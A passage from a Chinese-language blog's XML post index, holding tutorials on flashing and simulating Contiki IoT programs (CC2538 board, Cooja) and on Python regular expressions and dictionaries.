process&quot;);AUTOSTART_PROCESSES(&amp;hello_world_process);/*---------------------------------------------------------------------------*/PROCESS_THREAD(hello_world_process, ev, data)&#123; PROCESS_BEGIN(); while(1)&#123; etimer_set(&amp;et, 5 * CLOCK_SECOND); // 设置为每隔5s etimer溢出一次 PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&amp;et)); // 等待定时器溢出 sec = clock_seconds(); // 记录系统运行时间 单位s printf(&quot;%lu Seconds\n&quot;, sec); printf(&quot;Hello, world\n&quot;); &#125; PROCESS_END();&#125;/*---------------------------------------------------------------------------*/ 先编译后下载： 12$ make TARGET=cc2538dk$ make cc2538-demo.upload 下载出错的情况，遇到以下情况需要重新拔出USB再次插入，反正经常出现下面的情况，所以我最后还是转到Windows上进行下载了。 12ERROR: Can&apos;t connect to target. Ensure boot loader is started. (no answer on synch sequence)make: *** [cc2538-demo.upload] Error 1 12ERROR: [Errno 5] Input/output errormake: *** [cc2538-demo.upload] Error 1 使用 minicom 查看输出信息minicom 是一个串口通信工具，就像Windows下的超级终端。可用来与串口设备通信，如调试交换机和Modem等。 安装 minicom 1$ sudo apt-get install minicom 配置 minicom 1$ sudo minicom -s 进入了minicom的配置界面，使用上下键选择Serial port setup，回车，然后输入A，回车，修改 Serial Device 为 /dev/ttyUSB0，然后保存退出。 使用 minicom 1$ sudo minicom Windows 系统下烧写程序下载安装烧写工具TI Flash Programmer2 工具主要用于CC25xx，CC26xx等系列芯片的程序烧录，大家可以从TI官网下载：http://www.ti.com.cn/tool/cn/flash-programmer?keyMatch=flash%20programmer&amp;tisearch=Search-CN-Everything 由于访问可能出现问题，这里给出一个CSDN提供的下载地址：http://download.csdn.net/detail/zzfenglin/9626337 编译程序这里编译程序还是在Instant contiki上进行，因为如果要在 Windows 下编译的话还得使用IAR等开发工具，然后进行 contiki 的移植，所以我们还是使用官网推荐的方式使用 Instant contiki 吧。如上： 12$ cd /home/user/contiki/examples/cc2538dk$ make TARGET=cc2538dk 将得到的bin文件或者hex文件复制到Windwos，从虚拟机中复制文件到 Windous 需要使用 VMware 的 VMware tools 工具，可以点击菜单栏虚拟机-&gt;安装 VMware Tools，安装好之后即可像在同一个系统中复制粘贴了。 烧写程序将USB转TTL模块连接到电脑，然后打开TI Flash Programmer2。 点击左侧Refresh，找到USB设备，在左下方选择芯片型号：cc2538，中间Flash Images选择bin文件所在路径，下方 Action 勾选 Erase、Program、Verify。 按住开发板的Reset + Select：配合进入 bootloader 模式 点击TI Flash Programmer2下方播放按钮进行程序烧录，烧录成功会显示Success！ 打开串口助手查看效果]]></content>
      <categories>
        <category>IoT</category>
        <category>Contiki</category>
      </categories>
      <tags>
        <tag>［IoT,Contiki,CC2538dk］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Contiki Cooja仿真]]></title>
    <url>%2F2017%2F02%2F14%2FContiki-Cooja%E4%BB%BF%E7%9C%9F%2F</url>
    <content type="text"><![CDATA[Cooja是Contiki操作系统中的网络模拟器，Contiki设备经常组成大型无线网络，Cooja提供一个仿真环境，使开发人员能够看到他们的应用程序运行在大型网络，使得开发和调试变得更简单。 运行cooja在终端窗口进入cooja目录1cd contiki/tools/cooja 启动cooja1ant run 如果启动失败： 123456BUILD FAILED/home/user/contiki/tools/cooja/build.xml:199: The following error occurred while executing this line:/home/user/contiki/tools/cooja/apps/mspsim/build.xml:29: -----------------Could not find the MSPSim build file. Did you run &quot;git submodule update --init&quot;?---------------- 按提示输入以下命令： 1git submodule update --init 如果再次出错： 1fatal: Not a git repository (or any of the parent directories): .git 则需要： 12git initgit submodule update --init 再次输入启动命令进行启动 1ant run 如图，cooja已经运行起来，使用Ctrl + C 可结束cooja 另外，如果你使用contiki-3.0/tools/cooja目录下的cooja时很有可能出现上面所说的错误，并且无法解决！所以请使用contiki/tools/cooja目录下的cooja进行仿真。 仿真实验创建一个新的仿真点击File菜单然后点击New simulation 设置模拟选项 Simulation name 仿真名字 Radio medium 无线介质，下拉选项： UDGM:Distance Loss 单位圆盘图：距离损失 UDGM:Constant Loss 单位圆盘图：常量损失 DGRM：有向图通信 No radio traffic 无无线信道 Mote startup delay 节点启动延时 Random seed 随机种子生成 仿真窗口 Network window 网络窗口：显示在模拟网络中的所有节点 Timeline window 时间轴窗口：显示在模拟中的所有通信事件随着时间的推移-非常方便了解什么在网络上进行 Mote output window 节点输出窗口：显示所有节点的串口打印输出 Notes window 注释窗口：为仿真编写注释的地方 Simulation control window 仿真控制窗口：启动，暂停和重新加载我们的仿真 为仿真添加节点Motes -&gt; Add motes -&gt; Create new mote type -&gt; Sky mote 创建一个新的节点类型添加描述，然后点击Browse选择我们的Contiki应用。 国际惯例我们运行一个最简单的程序，进入到/home/user/contiki-3.0/examples/hello-world目录。 加载里面的hello-world.c，点击编译，等待编译完。 然后点击create创建，在弹出的窗口填写节点基本信息： 运行程序 我们可以看到在Network window已经有了一个节点，我们再点击控制Simulation control window的start按钮，在Mote output窗口可以看到打印出来的Hello world。 至此，我们初步了解了Cooja仿真器的用法，有了这个神器，我们就可以进行各种各样的模拟仿真实验，在复杂的网络中验证我们编写的程序。]]></content>
      <categories>
        <category>IoT</category>
        <category>Contiki</category>
      </categories>
      <tags>
        <tag>［IoT,Contiki,Cooja］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初识物联网操作系统：Contiki]]></title>
    <url>%2F2017%2F02%2F13%2F%E5%88%9D%E8%AF%86%E7%89%A9%E8%81%94%E7%BD%91%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%9AContiki%2F</url>
    <content type="text"><![CDATA[Contiki：面向物联网的开源操作系统。 Contiki简介 Contiki是一个开源的、高度可移植的、支持网络的多任务操作系统，由瑞典计算机科学学院的Adam Dunkels博士开发。 Contiki完全采用C语言开发，对硬件的要求极低，典型的配置下Contiki只占用约2Kbytes的RAM以及40Kbytes的Flash存储器，目前已经移植到8051单片机MSP430, AVR, ARM, PC机等硬件平台上。 Contiki支持IPv4/IPv6通信，提供了uIPv6协议栈、IPv4协议栈（uIP），支持TCP/UDP，还提供了线程、定时器、文件系统等功能。 Contiki操作系统是基于事件驱动的操作系统，在此内核上，应用程序可以在运行时动态加载，非常灵活。 Contiki实现了一种轻量级的名为protothread的线程模型，形式上类似于传统线程的编程风格，该模型中多个线程共享同一个任务栈，线程切换只有2个字节的开销。由于protothread线程模型和事件驱动机制是整个Contiki系统的运行核心。 官网：http://www.contiki-os.org/index.html Github地址：https://github.com/contiki-os/contiki Contiki配置准备下载instant ContikiInstant Contiki是基于Ubuntu的Contiki开发环境。它包含Contiki需要的所有工具和编译器。 https://sourceforge.net/projects/contiki/files/Instant%20Contiki/ 安装VMWare可以安装VMWare workstation也可以打开VMware player. 如何安装VMware player虚拟机教程 超级详细 vmware workstation 12 pro 虚拟机安装系统教程 打开instant Contiki使用VMWare Player打开instant Contiki，然后登录到该系统，密码为：user。 Contiki系统目录结构 apps: 放置contiki提供的应用，例如ftp、shell、http server等等，在项目程序开发过程中可以直接使用。使用这些应用程序的方式为，在项目的Makefile中，定义APPS = [应用程序名称]。在以后的示例中会具体看到如何使用apps。 core: 放置contiki的核心内容，调度(sys)，网络协议栈(net)，文件系统(cfs)，驱动的抽象层(dev)等等。 cpu：cpu目录下是Contiki目前支持的微处理器，例如arm、avr、msp430等等。如果需要支持新的微处理器，可以在这里添加相应的源代码。 platform：platform目录下是Contiki支持的硬件平台，例如mx231cc、micaz、sky、win32等等。Contiki的平台移植主要在这个目录下完成。这一部分的代码与相应的硬件平台相关。 examples：放置对应平台开发的示例程序。 doc: doc目录是Contiki帮助文档目录，对Contiki应用程序开发很有参考价值。使用前需要先用Doxygen进行编译。 tools: tools目录下是开发过程中常用的一些工具，例如CFS相关的makefsdata、网络相关的tunslip、模拟器cooja和mspsim等等。 其中移植主要修改的是三个目录： cpu: 添加芯片 platform: 添加平台 examples: 添加应用 示例分析国际惯例：Hello World程序 Contiki程序开发是以进程的方式实现，创建一个进程需要进行声明和定义。PROCESS(process_name, “process description”)宏用于声明一个进程；PROCESS_THREAD(process_name, event, data)宏用于定义进程执行主体。 进程执行主体代码中，必须以PROCESS_BEGIN()宏开始，以PROCESS_END()宏结束。此外，在进程中不能使用switch语句，慎重使用局部变量。 如果进程需要在系统启动时被自动执行，则可以使用AUTOSTART_PROCESSES(&amp;process_name)宏。该宏可以指定多个进程，如AUTOSTART_PROCESSES(&amp;process_1, &amp;process_2)，表示process_1和process_2都会在系统启动时被启动。 打开/contiki-3.0/examples/hello-world/目录下的hello-world.c： 1234567891011121314151617181920#include &quot;contiki.h&quot;#include &lt;stdio.h&gt; /* For printf() *//*---------------------------------------------------------------------------*//* 声明一个名为hello_world_process进程 */PROCESS(hello_world_process, &quot;Hello world process&quot;);/* 这个进程需要自动启动，即当节点启动时启动本进程 */AUTOSTART_PROCESSES(&amp;hello_world_process);/*---------------------------------------------------------------------------*//* hello_world_process进程的主体部分 */PROCESS_THREAD(hello_world_process, ev, data)&#123; /* 所有的进程开始执行前都必须要有这条语句 */ PROCESS_BEGIN(); printf(&quot;Hello, world\n&quot;); /* 所有的进程结束时都必须要有这条语句 */ PROCESS_END();&#125; 打开/contiki-3.0/examples/hello-world/目录下的Makefile文件。 1234567/* 项目名称（主文件名称） */CONTIKI_PROJECT = hello-worldall: $(CONTIKI_PROJECT)/* Contiki源文件根目录，根据您的实际情况修改 */CONTIKI = ../../* 包含Contiki的Makefile，以实现整个Contiki系统的编译 */include $(CONTIKI)/Makefile.include 编译项目在控制台/Shell中进入helloworld项目目录，运行如下命令： 1make TARGET=native 编译成功后，项目目录下就会生成hello-world.[目标平台]的目标文件，如hello-world.native。如果您使用的是Linux操作系统，可以运行如下命令查看Contiki程序运行结果： 1./hello-world.native 运行结果如下所示： 12Starting ContikiHello world :)]]></content>
      <categories>
        <category>IoT</category>
        <category>Contiki</category>
      </categories>
      <tags>
        <tag>［IoT,Contiki］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python正则表达式函数]]></title>
    <url>%2F2017%2F01%2F21%2FPython%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[Python 的 re 模块（Regular Expression 正则表达式）提供各种正则表达式的匹配操作，在文本解析、复杂字符串分析和信息提取时是一个非常有用的工具。本博客介绍了 re 模块的一些常用函数。 re.compile()函数 re 模块提供了一个正则表达式引擎的接口，可以把正则表达式编译成一个正则表达式对象并用它们来进行匹配。 1re.compile(strPattern[, flag]) 把那些经常使用的正则表达式编译成正则表达式对象，这样可以提高一定的效率。 12345678&gt;&gt;&gt; import re&gt;&gt;&gt; p = re.compile(&apos;a&#123;1,3&#125;&apos;)&gt;&gt;&gt; print p&lt;_sre.SRE_Pattern object at 0x033992C0&gt;&gt;&gt;&gt; p.findall(&apos;babaabaaa&apos;)[&apos;a&apos;, &apos;aa&apos;, &apos;aaa&apos;]&gt;&gt;&gt; p.findall(&apos;abaababa&apos;)[&apos;a&apos;, &apos;aa&apos;, &apos;a&apos;, &apos;a&apos;] 编译标志 编译标志让你可以修改正则表达式的一些运行方式。在 re 模块中标志可以使用两个名字，一个是全名如 IGNORECASE，一个是缩写，一字母形式如 I。 标志含义: DOTALL, S使 . 匹配包括换行在内的所有字符 IGNORECASE, I使匹配对大小写不敏感 LOCALE, L做本地化识别（locale-aware）匹配 MULTILINE, M多行匹配，影响 ^ 和 $ VERBOSE, X能够使用 REs 的 verbose 状态，使之被组织得更清晰易懂 I，IGNORECASE，使匹配对大小写不敏感；字符类和字符串匹配字母时忽略大小写。举个例子，[A-Z]也可以匹配小写字母，Spam 可以匹配 “Spam”, “spam”, 或 “spAM”。这个小写字母并不考虑当前位置。 re.match()函数 re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回None。 1re.match(pattern, string, flags=0) 第 1 个参数是正则表达式，这里为”(\w+)\s”，如果匹配成功，则返回一个Match，否则返回一个None； 第 2 个参数表示要匹配的字符串； 第 3 个参数是标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 MatchObject 实例也有几个方法和属性： group()返回被 RE 匹配的字符串 start()返回匹配开始的位置 end()返回匹配结束的位置 span()返回一个元组包含匹配 (开始,结束) 的位置 我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。 12345678910&gt;&gt;&gt; import re&gt;&gt;&gt; m = re.match(r&quot;www&quot;,&apos;www.fzyLine.com&apos;)&gt;&gt;&gt; print m,m.span(),m.group()&lt;_sre.SRE_Match object at 0x02897E58&gt; (0, 3) www&gt;&gt;&gt; m = re.match(r&quot;com&quot;,&apos;www.fzyLine.com&apos;)&gt;&gt;&gt; print m,m.span(),m.group()NoneTraceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: &apos;NoneType&apos; object has no attribute &apos;span&apos; re.search()函数 re.search 扫描整个字符串并返回第一个成功的匹配。 1re.search(pattern, string, flags=0) 参数含义与re.match一样。 匹配成功re.search方法返回一个匹配的对象，否则返回None。我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。 1234567&gt;&gt;&gt; import re&gt;&gt;&gt; m = re.search(r&quot;www&quot;,&apos;www.fzyLine.com&apos;)&gt;&gt;&gt; print m,m.span(),m.group()&lt;_sre.SRE_Match object at 0x02897E58&gt; (0, 3) www&gt;&gt;&gt; m = re.search(r&quot;com&quot;,&apos;www.fzyLine.com&apos;)&gt;&gt;&gt; print m,m.span(),m.group()&lt;_sre.SRE_Match object at 0x0284DDB0&gt; (12, 15) com re.match与re.search的区别： re.match 只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。 re.sub()函数1re.sub(pattern, repl, string, count) 其中， pattern : 正则中的模式字符串。 repl : 替换的字符串，也可为一个函数。 string : 要被查找替换的原始字符串。 count : 模式匹配后替换的最大次数，默认 0 ，表示替换所有的匹配。 re.sub 还允许使用函数对匹配项的替换进行复杂的处理。如：re.sub(r’\s’, lambda m: ‘[‘ + m.group(0) + ‘]’, text, 0)；将字符串中的空格’ ‘替换为’[ ]’。 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;\.&quot;&gt;&gt;&gt; re.sub(r,&apos;-&apos;,&apos;www.fzyLine.com&apos;)&apos;www-fzyLine-com&apos; re.subn()函数 subn() 与 sub() 相同，但会返回新的字符串和替换次数。 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;\.&quot;&gt;&gt;&gt; re.subn(r,&apos;-&apos;,&apos;www.fzyLine.com&apos;)(&apos;www-fzyLine-com&apos;, 2) re.split()函数 re.split可以用来分割字符串，如：re.split(r’\s+’, text)；将字符串按空格分割成一个单词列表。 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;\.&quot;&gt;&gt;&gt; re.split(r,&apos;www.fzyLine.com&apos;)[&apos;www&apos;, &apos;fzyLine&apos;, &apos;com&apos;] re.findall()函数 re.findall可以获取字符串中所有匹配的字符串。如：re.findall(r’\woo\w‘, text)；获取字符串中，包含’oo’的所有单词。 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;a\dc&quot;&gt;&gt;&gt; re.findall(r,&apos;a2cka4cka8c&apos;)[&apos;a2c&apos;, &apos;a4c&apos;, &apos;a8c&apos;] re.finditer()函数 finditer()找到 RE 匹配的所有子串，并把它们作为一个迭代器返回. 1234567891011&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;a\dc&quot;&gt;&gt;&gt; m = re.finditer(r,&apos;a2cka4cka8c&apos;)&gt;&gt;&gt; print m&lt;callable-iterator object at 0x0292A4B0&gt;&gt;&gt;&gt; for i in m:... print i.group()...a2ca4ca8c group函数group([group1,…]) 返回匹配到的一个或者多个子组。如果是一个参数，那么结果就是一个字符串，如果是多个参数，那么结果就是一个参数一个item的元组。 12345678910&gt;&gt;&gt; import re&gt;&gt;&gt; m = re.match(r&quot;(\d+),(\d+)&quot;,&apos;123,456&apos;)&gt;&gt;&gt; m.group()&apos;123,456&apos;&gt;&gt;&gt; m.group(1)&apos;123&apos;&gt;&gt;&gt; m.group(2)&apos;456&apos;&gt;&gt;&gt; m.group(1,2)(&apos;123&apos;, &apos;456&apos;) groups([default]) 返回一个包含所有子组的元组。Default是用来设置没有匹配到组的默认值的。Default默认是None。 123456789&gt;&gt;&gt; import re&gt;&gt;&gt; m = re.match(r&quot;(\d+),(\d+)&quot;,&apos;123,456&apos;)&gt;&gt;&gt; m.groups()(&apos;123&apos;, &apos;456&apos;)&gt;&gt;&gt; m = re.match(r&quot;(\d+),?(\d+)?&quot;,&apos;123&apos;)&gt;&gt;&gt; m.groups()(&apos;123&apos;, None)&gt;&gt;&gt; m.groups(&quot;0&quot;)(&apos;123&apos;, &apos;0&apos;) groupdict([default]) 返回匹配到的所有命名子组的字典。Key是name值，value是匹配到的值。参数default是没有匹配到的子组的默认值。这里与groups()方法的参数是一样的。默认值为None。groupdict()对没有name的子组不起作用，如下： 1234567&gt;&gt;&gt; import re&gt;&gt;&gt; m = re.match(r&quot;(\d+),(\d+)&quot;,&apos;123,456&apos;)&gt;&gt;&gt; m.groupdict()&#123;&#125;&gt;&gt;&gt; m = re.match(r&quot;(?P&lt;first&gt;\d+),(?P&lt;second&gt;\d+)&quot;,&apos;123,456&apos;)&gt;&gt;&gt; m.groupdict()&#123;&apos;second&apos;: &apos;456&apos;, &apos;first&apos;: &apos;123&apos;&#125;]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python正则表达式基础]]></title>
    <url>%2F2017%2F01%2F20%2FPython%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[正则表达式是一种小型的、高度专业化的编程语言，在Python中通过re模块实现。 正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。 简介 正则表达式是由普通字符（例如字符 a 到 z）以及特殊字符（称为”元字符”）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。 使用正则表达式可以： （1）测试字符串内的模式。 例如，可以测试输入字符串，以查看字符串内是否出现电话号码模式或信用卡号码模式。这称为数据验证。 （2）替换文本。 可以使用正则表达式来识别文档中的特定文本，完全删除该文本或者用其他文本替换它。 （3）基于模式匹配从字符串中提取子字符串。 可以查找文档内或输入域内特定的文本。 普通字符 大多数字母和字符一般都会和自身匹配 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;abc&quot;&gt;&gt;&gt; re.findall(r,&apos;abckkkabc&apos;)[&apos;abc&apos;, &apos;abc&apos;] 元字符常用元字符 . 匹配除换行符以外的任意字符 123456&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;.a&quot;&gt;&gt;&gt; re.findall(r,&apos;aabaca&apos;)[&apos;aa&apos;, &apos;ba&apos;, &apos;ca&apos;]&gt;&gt;&gt; re.findall(r,&apos;aabacadd&apos;)[&apos;aa&apos;, &apos;ba&apos;, &apos;ca&apos;] […] 字符集 常用来指定一个字符集：[abc],[a-z] 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&apos;t[io]p&apos;&gt;&gt;&gt; re.findall(r,&apos;top tip ttp tmp&apos;)[&apos;top&apos;, &apos;tip&apos;] 元字符在字符集中不起作用：[…$] 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&apos;t[io$]p&apos;&gt;&gt;&gt; re.findall(r,&apos;top tip ttp tmp t$p&apos;)[&apos;top&apos;, &apos;tip&apos;, &apos;t$p&apos;] 补集匹配不在区间范围内的字符：[^…] 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&apos;t[^io]p&apos;&gt;&gt;&gt; re.findall(r,&apos;top tip ttp tmp t$p&apos;)[&apos;ttp&apos;, &apos;tmp&apos;, &apos;t$p&apos;] ^ 匹配行的开始 匹配行首除非设置MULTILINE标志，它只是匹配字符串的开始。在MULTILINE模式里，它也可以直接匹配字符串中的每个换行。 123456&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&apos;^hi&apos;&gt;&gt;&gt; re.findall(r,&apos;hi, how are you? hi what are you doing?&apos;)[&apos;hi&apos;]&gt;&gt;&gt; re.findall(r,&apos;how are you? hi what are you doing?&apos;)[] $ 匹配行的结束 匹配行尾，行尾被定义为要么是字符串尾，要么是一个换行字符后面的任何位置。 123456&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&apos;you$&apos;&gt;&gt;&gt; re.findall(r,&apos;how are you&apos;)[&apos;you&apos;]&gt;&gt;&gt; re.findall(r,&apos;how are&apos;)[] \ 将下一字符标记为特殊字符、愿意字符、反向引用或八进制转义符。 反斜线后面可以接不同的字符以表示不同特殊意义，也可以用于取消所有元字符。 123456&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;\n&quot;&gt;&gt;&gt; re.findall(r,&apos;abc\n&apos;)[&apos;\n&apos;]&gt;&gt;&gt; re.findall(r,&apos;abc\\n&apos;)[] | 指示在两个或多个项之间进行选择。 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;ab|ac&quot;&gt;&gt;&gt; re.findall(r,&apos;abacad&apos;)[&apos;ab&apos;, &apos;ac&apos;] 预定义字符集 \d 匹配任何十进制数，相当于[0-9] \D 匹配任何非数字字符，相当于[^0-9] \s 匹配任何空白字符，相当于[\t\n\r\f\v] \S 匹配任何非空白字符，相当于[^\t\n\r\f\v] \w 匹配任何字母数字字符，相当于[a-zA-Z0-9] \W 匹配任何非字母数字字符，相当于[^a-zA-Z0-9] 12345678910111213141516171819202122&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;[0-9]&quot;&gt;&gt;&gt; re.findall(r,&apos;12ab34cd .;-!&apos;)[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;]&gt;&gt;&gt; r = r&quot;\d&quot;&gt;&gt;&gt; re.findall(r,&apos;12ab34cd .;-!&apos;)[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;]&gt;&gt;&gt; r = r&quot;\D&quot;&gt;&gt;&gt; re.findall(r,&apos;12ab34cd .;-!&apos;)[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos; &apos;, &apos;.&apos;, &apos;;&apos;, &apos;-&apos;, &apos;!&apos;]&gt;&gt;&gt; r = r&quot;\s&quot;&gt;&gt;&gt; re.findall(r,&apos;12ab34cd .;-!&apos;)[&apos; &apos;]&gt;&gt;&gt; r = r&quot;\S&quot;&gt;&gt;&gt; re.findall(r,&apos;12ab34cd .;-!&apos;)[&apos;1&apos;, &apos;2&apos;, &apos;a&apos;, &apos;b&apos;, &apos;3&apos;, &apos;4&apos;, &apos;c&apos;, &apos;d&apos;, &apos;.&apos;, &apos;;&apos;, &apos;-&apos;, &apos;!&apos;]&gt;&gt;&gt; r = r&quot;\w&quot;&gt;&gt;&gt; re.findall(r,&apos;12ab34cd .;-!&apos;)[&apos;1&apos;, &apos;2&apos;, &apos;a&apos;, &apos;b&apos;, &apos;3&apos;, &apos;4&apos;, &apos;c&apos;, &apos;d&apos;]&gt;&gt;&gt; r = r&quot;\W&quot;&gt;&gt;&gt; re.findall(r,&apos;12ab34cd .;-!&apos;)[&apos; &apos;, &apos;.&apos;, &apos;;&apos;, &apos;-&apos;, &apos;!&apos;] 常用重复限定符 字符 表示前一个字符可以被匹配零次或者任意多次，而不是只有一次。匹配引擎会试着重复尽可能多的次数。 12345678&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;ab*&quot;&gt;&gt;&gt; re.findall(r,&apos;a&apos;)[&apos;a&apos;]&gt;&gt;&gt; re.findall(r,&apos;ab&apos;)[&apos;ab&apos;]&gt;&gt;&gt; re.findall(r,&apos;abb&apos;)[&apos;abb&apos;] 字符 表示前一个字符可以被匹配一次或任意多次。 12345678&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;ab+&quot;&gt;&gt;&gt; re.findall(r,&apos;a&apos;)[]&gt;&gt;&gt; re.findall(r,&apos;ab&apos;)[&apos;ab&apos;]&gt;&gt;&gt; re.findall(r,&apos;abb&apos;)[&apos;abb&apos;] 注意： * 与 + 之间的不同：* 匹配零次或任意多次，所以可以根本就不出现，但是 + 则要求至少出现一次。 ? 字符 表示前一个字符可以被匹配一次或零次：可以认为它用于标识某事物是可选的。 12345678&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;ab?&quot;&gt;&gt;&gt; re.findall(r,&apos;a&apos;)[&apos;a&apos;]&gt;&gt;&gt; re.findall(r,&apos;ab&apos;)[&apos;ab&apos;]&gt;&gt;&gt; re.findall(r,&apos;abb&apos;)[&apos;ab&apos;] 贪婪模式与非贪婪模式： 贪婪匹配:正则表达式一般趋向于最大长度匹配，也就是所谓的贪婪匹配。 非贪婪匹配：就是匹配到结果就好，最少的匹配字符。 默认是贪婪模式；在量词后面直接加上一个问号？就是非贪婪模式。 1234567891011&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;ab+&quot;&gt;&gt;&gt; re.findall(r,&apos;ab&apos;)[&apos;ab&apos;]&gt;&gt;&gt; re.findall(r,&apos;abbb&apos;)[&apos;abbb&apos;]&gt;&gt;&gt; r = r&quot;ab+?&quot;&gt;&gt;&gt; re.findall(r,&apos;ab&apos;)[&apos;ab&apos;]&gt;&gt;&gt; re.findall(r,&apos;abbb&apos;)[&apos;ab&apos;] {m, n}限定范围 其中 m 和 n 是十进制整数。该限定符的意思是至少有 m 个重复，至多到 n 个重复。 忽略 m 会认为下边界是0，而忽略n的结果将是上边界为无穷大 {0,}等同于 ，{1,}等同于 + ，而{0,1}则与?相同。如果可以的话，最好用 , + 或 ? 1234567891011121314151617181920212223&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;a&#123;1,3&#125;&quot;&gt;&gt;&gt; re.findall(r,&apos;a&apos;)[&apos;a&apos;]&gt;&gt;&gt; re.findall(r,&apos;aa&apos;)[&apos;aa&apos;]&gt;&gt;&gt; re.findall(r,&apos;aaa&apos;)[&apos;aaa&apos;]&gt;&gt;&gt; re.findall(r,&apos;aaaa&apos;)[&apos;aaa&apos;, &apos;a&apos;]&gt;&gt;&gt; re.findall(r,&apos;ab&apos;)[&apos;a&apos;]&gt;&gt;&gt; re.findall(r,&apos;b&apos;)[]&gt;&gt;&gt; r = r&quot;a&#123;0,&#125;&quot;&gt;&gt;&gt; re.findall(r,&apos;aaaaa&apos;)[&apos;aaaaa&apos;, &apos;&apos;]&gt;&gt;&gt; r = r&quot;a&#123;1,&#125;&quot;&gt;&gt;&gt; re.findall(r,&apos;aaaaa&apos;)[&apos;aaaaa&apos;]&gt;&gt;&gt; r = r&quot;a&#123;0,1&#125;&quot;&gt;&gt;&gt; re.findall(r,&apos;aaaaa&apos;)[&apos;a&apos;, &apos;a&apos;, &apos;a&apos;, &apos;a&apos;, &apos;a&apos;, &apos;&apos;] 特殊应用忽略大小写(?i) 用于忽略大小写匹配 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;(?i)ab&quot;&gt;&gt;&gt; re.findall(r,&apos;AbABabcd&apos;)[&apos;Ab&apos;, &apos;AB&apos;, &apos;ab&apos;] 单词分界符\b 表示单词分界符 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;\bhi\b&quot;&gt;&gt;&gt; re.findall(r,&apos;his him hi history&apos;)[&apos;hi&apos;]]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python基础详解-字典]]></title>
    <url>%2F2017%2F01%2F13%2FPython%E5%9F%BA%E7%A1%80%E8%AF%A6%E8%A7%A3-%E5%AD%97%E5%85%B8%2F</url>
    <content type="text"><![CDATA[字典是Python中唯一内建的映射类型（哈希表）。字典中的值并没有特殊的顺序，但是都存储在一个特定的键下。键可以是数字、字符串甚至是元组。 字典中的键是唯一的，但值并不唯一。 字典对象是可变的，但是字典的键必须使用不可变对象，并且一个字典中可以使用不同类型的键值。 创建字典使用{}直接创建123&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; d&#123;&apos;age&apos;: &apos;22&apos;, &apos;name&apos;: &apos;fzy&apos;, &apos;class&apos;: &apos;13-3&apos;&#125; 使用工厂方法dict()1234&gt;&gt;&gt; items = [(&apos;name&apos;,&apos;fzy&apos;),(&apos;age&apos;,&apos;22&apos;),(&apos;class&apos;,&apos;13-3&apos;)]&gt;&gt;&gt; d = dict(items)&gt;&gt;&gt; d&#123;&apos;age&apos;: &apos;22&apos;, &apos;name&apos;: &apos;fzy&apos;, &apos;class&apos;: &apos;13-3&apos;&#125; dict函数也可以通过关键字参数来创建字典。 123&gt;&gt;&gt; d = dict(name=&apos;fzy&apos;,age=&apos;22&apos;)&gt;&gt;&gt; d&#123;&apos;age&apos;: &apos;22&apos;, &apos;name&apos;: &apos;fzy&apos;&#125; 使用内建方法fromkeys()创建’默认‘字典，字典中元素具有相同的value，如果没有给出，默认为None。 12&gt;&gt;&gt; &#123;&#125;.fromkeys((&apos;x&apos;,&apos;y&apos;),-1)&#123;&apos;y&apos;: -1, &apos;x&apos;: -1&#125; 